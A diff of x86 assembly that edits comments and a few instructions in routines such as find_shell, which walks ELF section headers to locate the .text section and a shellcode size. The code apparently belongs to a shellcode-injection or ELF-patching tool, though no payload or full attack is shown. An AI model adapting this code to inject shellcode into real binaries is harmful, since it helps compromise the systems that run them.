@@ -657,7 +657,7 @@ ret_patch:
 
 
 
-find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a pointer to .text section, and stores the shellcode size
+find_shell:	; void *find_shell(void *data, size_t shellcode_size); returns a pointer to the .text section and stores the shellcode size
 	push ebp
 	mov ebp, esp
 
@@ -670,7 +670,7 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 
 	mov ebx, [ebp + 0xc] 		; this will stay in ebx for the rest of the function so we don't keep accessing memorry
 
-	;;taking care of the generic section pointer (@ ebp - 4)
+	;;taking care of the generic section pointer
 	mov edi, [ebx + e_shoff]
 	add edi, ebx			; for later
 	;;
@@ -680,13 +680,13 @@ find_shell: ; void* find_shell(void *data, size_t shellcode_size); returns a poi
 	mov ax, word[ebx + e_shstrndx]
 	movzx eax, ax
 	mov ecx, Elf32_Shdr_size
-	mul cl				; eax now has the string table file offset in file, and edx has 
+	mul cx				; eax now has the string table file offset in file, and edx has 
 					; the sections base in memorry
 	add eax, edi
 	; now we have a pointer to the string table section, but we want the actuall offset of the section
 	; in memorry
 	mov edx, [eax + sh_offset]
-	add edx, ebx			; from now on, edx will have the pointer to the string index table, 
+	add edx, ebx			; from now on, edx will haveae pointer to the string index table, 
 					; we're gonna use this later
 
 
@@ -702,6 +702,7 @@ parsing_loop:
 	add esi, edx
 	push esi
 	call strcmp
+
 	add esp, 4			; so we don't have to keep track of the stack 
 	;do some error checking
 	test eax, eax
@@ -723,7 +724,7 @@ no_text_section:
 
 found_text_section:;
 	;storing the address of the section header
-	mov eax, edi			; the section header pointer
+	;mov eax, edi			; the section header pointer
 	mov eax, [edi + sh_offset] 	; the actual section offset
 	add eax, ebx			; ebx still contains the mmap memory base ; this eax will be returned to 
 					; the previous function!
@@ -959,7 +960,7 @@ cmp_loop:
 	xor dh, dl
 	jne diff_buffers
 
-	dec ecx  ; dec does take care of the flags
+	dec ecx  			; dec does take care of the flags
 	jns cmp_loop
 	jmp same_buffers
 
@@ -982,7 +983,7 @@ end:
 
 
 
-exit:	;void exit(int return_stat)
+exit:	;void exit(int return_state)
 	xor eax, eax
 	pop ebx
 	inc eax
